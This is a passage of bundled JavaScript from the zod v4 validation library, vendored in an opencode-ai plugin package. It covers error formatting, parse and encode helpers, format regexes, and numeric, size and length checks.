  if (cleanHex.length % 2 !== 0) {
    throw new Error("Invalid hex string length");
  }
  const bytes = new Uint8Array(cleanHex.length / 2);
  for (let i = 0;i < cleanHex.length; i += 2) {
    bytes[i / 2] = Number.parseInt(cleanHex.slice(i, i + 2), 16);
  }
  return bytes;
}
function uint8ArrayToHex2(bytes) {
  return Array.from(bytes).map((b) => b.toString(16).padStart(2, "0")).join("");
}

class Class2 {
  constructor(..._args) {}
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/errors.js
var initializer3 = (inst, def) => {
  inst.name = "$ZodError";
  Object.defineProperty(inst, "_zod", {
    value: inst._zod,
    enumerable: false
  });
  Object.defineProperty(inst, "issues", {
    value: def,
    enumerable: false
  });
  inst.message = JSON.stringify(def, jsonStringifyReplacer2, 2);
  Object.defineProperty(inst, "toString", {
    value: () => inst.message,
    enumerable: false
  });
};
var $ZodError2 = $constructor2("$ZodError", initializer3);
var $ZodRealError2 = $constructor2("$ZodError", initializer3, { Parent: Error });
function flattenError2(error48, mapper = (issue3) => issue3.message) {
  const fieldErrors = {};
  const formErrors = [];
  for (const sub of error48.issues) {
    if (sub.path.length > 0) {
      fieldErrors[sub.path[0]] = fieldErrors[sub.path[0]] || [];
      fieldErrors[sub.path[0]].push(mapper(sub));
    } else {
      formErrors.push(mapper(sub));
    }
  }
  return { formErrors, fieldErrors };
}
function formatError2(error48, _mapper) {
  const mapper = _mapper || function(issue3) {
    return issue3.message;
  };
  const fieldErrors = { _errors: [] };
  const processError = (error49) => {
    for (const issue3 of error49.issues) {
      if (issue3.code === "invalid_union" && issue3.errors.length) {
        issue3.errors.map((issues) => processError({ issues }));
      } else if (issue3.code === "invalid_key") {
        processError({ issues: issue3.issues });
      } else if (issue3.code === "invalid_element") {
        processError({ issues: issue3.issues });
      } else if (issue3.path.length === 0) {
        fieldErrors._errors.push(mapper(issue3));
      } else {
        let curr = fieldErrors;
        let i = 0;
        while (i < issue3.path.length) {
          const el = issue3.path[i];
          const terminal = i === issue3.path.length - 1;
          if (!terminal) {
            curr[el] = curr[el] || { _errors: [] };
          } else {
            curr[el] = curr[el] || { _errors: [] };
            curr[el]._errors.push(mapper(issue3));
          }
          curr = curr[el];
          i++;
        }
      }
    }
  };
  processError(error48);
  return fieldErrors;
}
function treeifyError2(error48, _mapper) {
  const mapper = _mapper || function(issue3) {
    return issue3.message;
  };
  const result = { errors: [] };
  const processError = (error49, path = []) => {
    var _a2, _b;
    for (const issue3 of error49.issues) {
      if (issue3.code === "invalid_union" && issue3.errors.length) {
        issue3.errors.map((issues) => processError({ issues }, issue3.path));
      } else if (issue3.code === "invalid_key") {
        processError({ issues: issue3.issues }, issue3.path);
      } else if (issue3.code === "invalid_element") {
        processError({ issues: issue3.issues }, issue3.path);
      } else {
        const fullpath = [...path, ...issue3.path];
        if (fullpath.length === 0) {
          result.errors.push(mapper(issue3));
          continue;
        }
        let curr = result;
        let i = 0;
        while (i < fullpath.length) {
          const el = fullpath[i];
          const terminal = i === fullpath.length - 1;
          if (typeof el === "string") {
            curr.properties ?? (curr.properties = {});
            (_a2 = curr.properties)[el] ?? (_a2[el] = { errors: [] });
            curr = curr.properties[el];
          } else {
            curr.items ?? (curr.items = []);
            (_b = curr.items)[el] ?? (_b[el] = { errors: [] });
            curr = curr.items[el];
          }
          if (terminal) {
            curr.errors.push(mapper(issue3));
          }
          i++;
        }
      }
    }
  };
  processError(error48);
  return result;
}
function toDotPath2(_path) {
  const segs = [];
  const path = _path.map((seg) => typeof seg === "object" ? seg.key : seg);
  for (const seg of path) {
    if (typeof seg === "number")
      segs.push(`[${seg}]`);
    else if (typeof seg === "symbol")
      segs.push(`[${JSON.stringify(String(seg))}]`);
    else if (/[^\w$]/.test(seg))
      segs.push(`[${JSON.stringify(seg)}]`);
    else {
      if (segs.length)
        segs.push(".");
      segs.push(seg);
    }
  }
  return segs.join("");
}
function prettifyError2(error48) {
  const lines = [];
  const issues = [...error48.issues].sort((a, b) => (a.path ?? []).length - (b.path ?? []).length);
  for (const issue3 of issues) {
    lines.push(`\u2716 ${issue3.message}`);
    if (issue3.path?.length)
      lines.push(`  \u2192 at ${toDotPath2(issue3.path)}`);
  }
  return lines.join(`
`);
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/parse.js
var _parse2 = (_Err) => (schema, value, _ctx, _params) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: false }) : { async: false };
  const result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise) {
    throw new $ZodAsyncError2;
  }
  if (result.issues.length) {
    const e = new (_params?.Err ?? _Err)(result.issues.map((iss) => finalizeIssue2(iss, ctx, config2())));
    captureStackTrace2(e, _params?.callee);
    throw e;
  }
  return result.value;
};
var parse5 = /* @__PURE__ */ _parse2($ZodRealError2);
var _parseAsync2 = (_Err) => async (schema, value, _ctx, params) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: true }) : { async: true };
  let result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise)
    result = await result;
  if (result.issues.length) {
    const e = new (params?.Err ?? _Err)(result.issues.map((iss) => finalizeIssue2(iss, ctx, config2())));
    captureStackTrace2(e, params?.callee);
    throw e;
  }
  return result.value;
};
var parseAsync3 = /* @__PURE__ */ _parseAsync2($ZodRealError2);
var _safeParse2 = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? { ..._ctx, async: false } : { async: false };
  const result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise) {
    throw new $ZodAsyncError2;
  }
  return result.issues.length ? {
    success: false,
    error: new (_Err ?? $ZodError2)(result.issues.map((iss) => finalizeIssue2(iss, ctx, config2())))
  } : { success: true, data: result.value };
};
var safeParse3 = /* @__PURE__ */ _safeParse2($ZodRealError2);
var _safeParseAsync2 = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: true }) : { async: true };
  let result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise)
    result = await result;
  return result.issues.length ? {
    success: false,
    error: new _Err(result.issues.map((iss) => finalizeIssue2(iss, ctx, config2())))
  } : { success: true, data: result.value };
};
var safeParseAsync3 = /* @__PURE__ */ _safeParseAsync2($ZodRealError2);
var _encode2 = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _parse2(_Err)(schema, value, ctx);
};
var encode3 = /* @__PURE__ */ _encode2($ZodRealError2);
var _decode2 = (_Err) => (schema, value, _ctx) => {
  return _parse2(_Err)(schema, value, _ctx);
};
var decode3 = /* @__PURE__ */ _decode2($ZodRealError2);
var _encodeAsync2 = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _parseAsync2(_Err)(schema, value, ctx);
};
var encodeAsync3 = /* @__PURE__ */ _encodeAsync2($ZodRealError2);
var _decodeAsync2 = (_Err) => async (schema, value, _ctx) => {
  return _parseAsync2(_Err)(schema, value, _ctx);
};
var decodeAsync3 = /* @__PURE__ */ _decodeAsync2($ZodRealError2);
var _safeEncode2 = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _safeParse2(_Err)(schema, value, ctx);
};
var safeEncode3 = /* @__PURE__ */ _safeEncode2($ZodRealError2);
var _safeDecode2 = (_Err) => (schema, value, _ctx) => {
  return _safeParse2(_Err)(schema, value, _ctx);
};
var safeDecode3 = /* @__PURE__ */ _safeDecode2($ZodRealError2);
var _safeEncodeAsync2 = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _safeParseAsync2(_Err)(schema, value, ctx);
};
var safeEncodeAsync3 = /* @__PURE__ */ _safeEncodeAsync2($ZodRealError2);
var _safeDecodeAsync2 = (_Err) => async (schema, value, _ctx) => {
  return _safeParseAsync2(_Err)(schema, value, _ctx);
};
var safeDecodeAsync3 = /* @__PURE__ */ _safeDecodeAsync2($ZodRealError2);
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/regexes.js
var exports_regexes2 = {};
__export(exports_regexes2, {
  xid: () => xid3,
  uuid7: () => uuid72,
  uuid6: () => uuid62,
  uuid4: () => uuid42,
  uuid: () => uuid3,
  uppercase: () => uppercase2,
  unicodeEmail: () => unicodeEmail2,
  undefined: () => _undefined4,
  ulid: () => ulid3,
  time: () => time3,
  string: () => string4,
  sha512_hex: () => sha512_hex2,
  sha512_base64url: () => sha512_base64url2,
  sha512_base64: () => sha512_base642,
  sha384_hex: () => sha384_hex2,
  sha384_base64url: () => sha384_base64url2,
  sha384_base64: () => sha384_base642,
  sha256_hex: () => sha256_hex2,
  sha256_base64url: () => sha256_base64url2,
  sha256_base64: () => sha256_base642,
  sha1_hex: () => sha1_hex2,
  sha1_base64url: () => sha1_base64url2,
  sha1_base64: () => sha1_base642,
  rfc5322Email: () => rfc5322Email2,
  number: () => number4,
  null: () => _null4,
  nanoid: () => nanoid3,
  md5_hex: () => md5_hex2,
  md5_base64url: () => md5_base64url2,
  md5_base64: () => md5_base642,
  lowercase: () => lowercase2,
  ksuid: () => ksuid3,
  ipv6: () => ipv63,
  ipv4: () => ipv43,
  integer: () => integer2,
  idnEmail: () => idnEmail2,
  html5Email: () => html5Email2,
  hostname: () => hostname3,
  hex: () => hex3,
  guid: () => guid3,
  extendedDuration: () => extendedDuration2,
  emoji: () => emoji3,
  email: () => email3,
  e164: () => e1643,
  duration: () => duration3,
  domain: () => domain2,
  datetime: () => datetime3,
  date: () => date5,
  cuid2: () => cuid23,
  cuid: () => cuid5,
  cidrv6: () => cidrv63,
  cidrv4: () => cidrv43,
  browserEmail: () => browserEmail2,
  boolean: () => boolean4,
  bigint: () => bigint4,
  base64url: () => base64url3,
  base64: () => base643
});
var cuid5 = /^[cC][^\s-]{8,}$/;
var cuid23 = /^[0-9a-z]+$/;
var ulid3 = /^[0-9A-HJKMNP-TV-Za-hjkmnp-tv-z]{26}$/;
var xid3 = /^[0-9a-vA-V]{20}$/;
var ksuid3 = /^[A-Za-z0-9]{27}$/;
var nanoid3 = /^[a-zA-Z0-9_-]{21}$/;
var duration3 = /^P(?:(\d+W)|(?!.*W)(?=\d|T\d)(\d+Y)?(\d+M)?(\d+D)?(T(?=\d)(\d+H)?(\d+M)?(\d+([.,]\d+)?S)?)?)$/;
var extendedDuration2 = /^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/;
var guid3 = /^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})$/;
var uuid3 = (version2) => {
  if (!version2)
    return /^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-8][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}|00000000-0000-0000-0000-000000000000|ffffffff-ffff-ffff-ffff-ffffffffffff)$/;
  return new RegExp(`^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-${version2}[0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12})$`);
};
var uuid42 = /* @__PURE__ */ uuid3(4);
var uuid62 = /* @__PURE__ */ uuid3(6);
var uuid72 = /* @__PURE__ */ uuid3(7);
var email3 = /^(?!\.)(?!.*\.\.)([A-Za-z0-9_'+\-\.]*)[A-Za-z0-9_+-]@([A-Za-z0-9][A-Za-z0-9\-]*\.)+[A-Za-z]{2,}$/;
var html5Email2 = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
var rfc5322Email2 = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
var unicodeEmail2 = /^[^\s@"]{1,64}@[^\s@]{1,255}$/u;
var idnEmail2 = unicodeEmail2;
var browserEmail2 = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
var _emoji3 = `^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$`;
function emoji3() {
  return new RegExp(_emoji3, "u");
}
var ipv43 = /^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/;
var ipv63 = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:))$/;
var cidrv43 = /^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/([0-9]|[1-2][0-9]|3[0-2])$/;
var cidrv63 = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|::|([0-9a-fA-F]{1,4})?::([0-9a-fA-F]{1,4}:?){0,6})\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/;
var base643 = /^$|^(?:[0-9a-zA-Z+/]{4})*(?:(?:[0-9a-zA-Z+/]{2}==)|(?:[0-9a-zA-Z+/]{3}=))?$/;
var base64url3 = /^[A-Za-z0-9_-]*$/;
var hostname3 = /^(?=.{1,253}\.?$)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[-0-9a-zA-Z]{0,61}[0-9a-zA-Z])?)*\.?$/;
var domain2 = /^([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
var e1643 = /^\+(?:[0-9]){6,14}[0-9]$/;
var dateSource2 = `(?:(?:\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-(?:(?:0[13578]|1[02])-(?:0[1-9]|[12]\\d|3[01])|(?:0[469]|11)-(?:0[1-9]|[12]\\d|30)|(?:02)-(?:0[1-9]|1\\d|2[0-8])))`;
var date5 = /* @__PURE__ */ new RegExp(`^${dateSource2}$`);
function timeSource2(args) {
  const hhmm = `(?:[01]\\d|2[0-3]):[0-5]\\d`;
  const regex = typeof args.precision === "number" ? args.precision === -1 ? `${hhmm}` : args.precision === 0 ? `${hhmm}:[0-5]\\d` : `${hhmm}:[0-5]\\d\\.\\d{${args.precision}}` : `${hhmm}(?::[0-5]\\d(?:\\.\\d+)?)?`;
  return regex;
}
function time3(args) {
  return new RegExp(`^${timeSource2(args)}$`);
}
function datetime3(args) {
  const time4 = timeSource2({ precision: args.precision });
  const opts = ["Z"];
  if (args.local)
    opts.push("");
  if (args.offset)
    opts.push(`([+-](?:[01]\\d|2[0-3]):[0-5]\\d)`);
  const timeRegex = `${time4}(?:${opts.join("|")})`;
  return new RegExp(`^${dateSource2}T(?:${timeRegex})$`);
}
var string4 = (params) => {
  const regex = params ? `[\\s\\S]{${params?.minimum ?? 0},${params?.maximum ?? ""}}` : `[\\s\\S]*`;
  return new RegExp(`^${regex}$`);
};
var bigint4 = /^-?\d+n?$/;
var integer2 = /^-?\d+$/;
var number4 = /^-?\d+(?:\.\d+)?/;
var boolean4 = /^(?:true|false)$/i;
var _null4 = /^null$/i;
var _undefined4 = /^undefined$/i;
var lowercase2 = /^[^A-Z]*$/;
var uppercase2 = /^[^a-z]*$/;
var hex3 = /^[0-9a-fA-F]*$/;
function fixedBase642(bodyLength, padding) {
  return new RegExp(`^[A-Za-z0-9+/]{${bodyLength}}${padding}$`);
}
function fixedBase64url2(length) {
  return new RegExp(`^[A-Za-z0-9_-]{${length}}$`);
}
var md5_hex2 = /^[0-9a-fA-F]{32}$/;
var md5_base642 = /* @__PURE__ */ fixedBase642(22, "==");
var md5_base64url2 = /* @__PURE__ */ fixedBase64url2(22);
var sha1_hex2 = /^[0-9a-fA-F]{40}$/;
var sha1_base642 = /* @__PURE__ */ fixedBase642(27, "=");
var sha1_base64url2 = /* @__PURE__ */ fixedBase64url2(27);
var sha256_hex2 = /^[0-9a-fA-F]{64}$/;
var sha256_base642 = /* @__PURE__ */ fixedBase642(43, "=");
var sha256_base64url2 = /* @__PURE__ */ fixedBase64url2(43);
var sha384_hex2 = /^[0-9a-fA-F]{96}$/;
var sha384_base642 = /* @__PURE__ */ fixedBase642(64, "");
var sha384_base64url2 = /* @__PURE__ */ fixedBase64url2(64);
var sha512_hex2 = /^[0-9a-fA-F]{128}$/;
var sha512_base642 = /* @__PURE__ */ fixedBase642(86, "==");
var sha512_base64url2 = /* @__PURE__ */ fixedBase64url2(86);

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/checks.js
var $ZodCheck2 = /* @__PURE__ */ $constructor2("$ZodCheck", (inst, def) => {
  var _a2;
  inst._zod ?? (inst._zod = {});
  inst._zod.def = def;
  (_a2 = inst._zod).onattach ?? (_a2.onattach = []);
});
var numericOriginMap2 = {
  number: "number",
  bigint: "bigint",
  object: "date"
};
var $ZodCheckLessThan2 = /* @__PURE__ */ $constructor2("$ZodCheckLessThan", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const origin = numericOriginMap2[typeof def.value];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    const curr = (def.inclusive ? bag.maximum : bag.exclusiveMaximum) ?? Number.POSITIVE_INFINITY;
    if (def.value < curr) {
      if (def.inclusive)
        bag.maximum = def.value;
      else
        bag.exclusiveMaximum = def.value;
    }
  });
  inst._zod.check = (payload) => {
    if (def.inclusive ? payload.value <= def.value : payload.value < def.value) {
      return;
    }
    payload.issues.push({
      origin,
      code: "too_big",
      maximum: def.value,
      input: payload.value,
      inclusive: def.inclusive,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckGreaterThan2 = /* @__PURE__ */ $constructor2("$ZodCheckGreaterThan", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const origin = numericOriginMap2[typeof def.value];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    const curr = (def.inclusive ? bag.minimum : bag.exclusiveMinimum) ?? Number.NEGATIVE_INFINITY;
    if (def.value > curr) {
      if (def.inclusive)
        bag.minimum = def.value;
      else
        bag.exclusiveMinimum = def.value;
    }
  });
  inst._zod.check = (payload) => {
    if (def.inclusive ? payload.value >= def.value : payload.value > def.value) {
      return;
    }
    payload.issues.push({
      origin,
      code: "too_small",
      minimum: def.value,
      input: payload.value,
      inclusive: def.inclusive,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMultipleOf2 = /* @__PURE__ */ $constructor2("$ZodCheckMultipleOf", (inst, def) => {
  $ZodCheck2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    var _a2;
    (_a2 = inst2._zod.bag).multipleOf ?? (_a2.multipleOf = def.value);
  });
  inst._zod.check = (payload) => {
    if (typeof payload.value !== typeof def.value)
      throw new Error("Cannot mix number and bigint in multiple_of check.");
    const isMultiple = typeof payload.value === "bigint" ? payload.value % def.value === BigInt(0) : floatSafeRemainder2(payload.value, def.value) === 0;
    if (isMultiple)
      return;
    payload.issues.push({
      origin: typeof payload.value,
      code: "not_multiple_of",
      divisor: def.value,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckNumberFormat2 = /* @__PURE__ */ $constructor2("$ZodCheckNumberFormat", (inst, def) => {
  $ZodCheck2.init(inst, def);
  def.format = def.format || "float64";
  const isInt = def.format?.includes("int");
  const origin = isInt ? "int" : "number";
  const [minimum, maximum] = NUMBER_FORMAT_RANGES2[def.format];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    bag.minimum = minimum;
    bag.maximum = maximum;
    if (isInt)
      bag.pattern = integer2;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    if (isInt) {
      if (!Number.isInteger(input)) {
        payload.issues.push({
          expected: origin,
          format: def.format,
          code: "invalid_type",
          continue: false,
          input,
          inst
        });
        return;
      }
      if (!Number.isSafeInteger(input)) {
        if (input > 0) {
          payload.issues.push({
            input,
            code: "too_big",
            maximum: Number.MAX_SAFE_INTEGER,
            note: "Integers must be within the safe integer range.",
            inst,
            origin,
            continue: !def.abort
          });
        } else {
          payload.issues.push({
            input,
            code: "too_small",
            minimum: Number.MIN_SAFE_INTEGER,
            note: "Integers must be within the safe integer range.",
            inst,
            origin,
            continue: !def.abort
          });
        }
        return;
      }
    }
    if (input < minimum) {
      payload.issues.push({
        origin: "number",
        input,
        code: "too_small",
        minimum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
    if (input > maximum) {
      payload.issues.push({
        origin: "number",
        input,
        code: "too_big",
        maximum,
        inst
      });
    }
  };
});
var $ZodCheckBigIntFormat2 = /* @__PURE__ */ $constructor2("$ZodCheckBigIntFormat", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const [minimum, maximum] = BIGINT_FORMAT_RANGES2[def.format];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    bag.minimum = minimum;
    bag.maximum = maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    if (input < minimum) {
      payload.issues.push({
        origin: "bigint",
        input,
        code: "too_small",
        minimum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
    if (input > maximum) {
      payload.issues.push({
        origin: "bigint",
        input,
        code: "too_big",
        maximum,
        inst
      });
    }
  };
});
var $ZodCheckMaxSize2 = /* @__PURE__ */ $constructor2("$ZodCheckMaxSize", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.maximum ?? Number.POSITIVE_INFINITY;
    if (def.maximum < curr)
      inst2._zod.bag.maximum = def.maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size <= def.maximum)
      return;
    payload.issues.push({
      origin: getSizableOrigin2(input),
      code: "too_big",
      maximum: def.maximum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMinSize2 = /* @__PURE__ */ $constructor2("$ZodCheckMinSize", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.minimum ?? Number.NEGATIVE_INFINITY;
    if (def.minimum > curr)
      inst2._zod.bag.minimum = def.minimum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size >= def.minimum)
      return;
    payload.issues.push({
      origin: getSizableOrigin2(input),
      code: "too_small",
      minimum: def.minimum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckSizeEquals2 = /* @__PURE__ */ $constructor2("$ZodCheckSizeEquals", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.minimum = def.size;
    bag.maximum = def.size;
    bag.size = def.size;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size === def.size)
      return;
    const tooBig = size > def.size;
    payload.issues.push({
      origin: getSizableOrigin2(input),
      ...tooBig ? { code: "too_big", maximum: def.size } : { code: "too_small", minimum: def.size },
      inclusive: true,
      exact: true,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMaxLength2 = /* @__PURE__ */ $constructor2("$ZodCheckMaxLength", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.maximum ?? Number.POSITIVE_INFINITY;
    if (def.maximum < curr)
      inst2._zod.bag.maximum = def.maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length <= def.maximum)
      return;
    const origin = getLengthableOrigin2(input);
    payload.issues.push({
      origin,
      code: "too_big",
      maximum: def.maximum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMinLength2 = /* @__PURE__ */ $constructor2("$ZodCheckMinLength", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.minimum ?? Number.NEGATIVE_INFINITY;
    if (def.minimum > curr)
      inst2._zod.bag.minimum = def.minimum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length >= def.minimum)
      return;
    const origin = getLengthableOrigin2(input);
    payload.issues.push({
      origin,
      code: "too_small",
      minimum: def.minimum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckLengthEquals2 = /* @__PURE__ */ $constructor2("$ZodCheckLengthEquals", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.minimum = def.length;
    bag.maximum = def.length;
    bag.length = def.length;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length === def.length)
      return;
    const origin = getLengthableOrigin2(input);
    const tooBig = length > def.length;
    payload.issues.push({
      origin,
      ...tooBig ? { code: "too_big", maximum: def.length } : { code: "too_small", minimum: def.length },
      inclusive: true,
      exact: true,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckStringFormat2 = /* @__PURE__ */ $constructor2("$ZodCheckStringFormat", (inst, def) => {
  var _a2, _b;
  $ZodCheck2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    if (def.pattern) {
      bag.patterns ?? (bag.patterns = new Set);
      bag.patterns.add(def.pattern);
    }
  });
  if (def.pattern)
    (_a2 = inst._zod).check ?? (_a2.check = (payload) => {
      def.pattern.lastIndex = 0;
      if (def.pattern.test(payload.value))
        return;
      payload.issues.push({
        origin: "string",
        code: "invalid_format",
        format: def.format,
        input: payload.value,
        ...def.pattern ? { pattern: def.pattern.toString() } : {},
        inst,
        continue: !def.abort
      });
    });
  else
    (_b = inst._zod).check ?? (_b.check = () => {});
});
var $ZodCheckRegex2 = /* @__PURE__ */ $constructor2("$ZodCheckRegex", (inst, def) => {
  $ZodCheckStringFormat2.init(inst, def);
  inst._zod.check = (payload) => {
    def.pattern.lastIndex = 0;
    if (def.pattern.test(payload.value))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "regex",
      input: payload.value,
      pattern: def.pattern.toString(),
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckLowerCase2 = /* @__PURE__ */ $constructor2("$ZodCheckLowerCase", (inst, def) => {
  def.pattern ?? (def.pattern = lowercase2);
  $ZodCheckStringFormat2.init(inst, def);
});
var $ZodCheckUpperCase2 = /* @__PURE__ */ $constructor2("$ZodCheckUpperCase", (inst, def) => {
  def.pattern ?? (def.pattern = uppercase2);
  $ZodCheckStringFormat2.init(inst, def);
});
var $ZodCheckIncludes2 = /* @__PURE__ */ $constructor2("$ZodCheckIncludes", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const escapedRegex = escapeRegex2(def.includes);
  const pattern = new RegExp(typeof def.position === "number" ? `^.{${def.position}}${escapedRegex}` : escapedRegex);
  def.pattern = pattern;
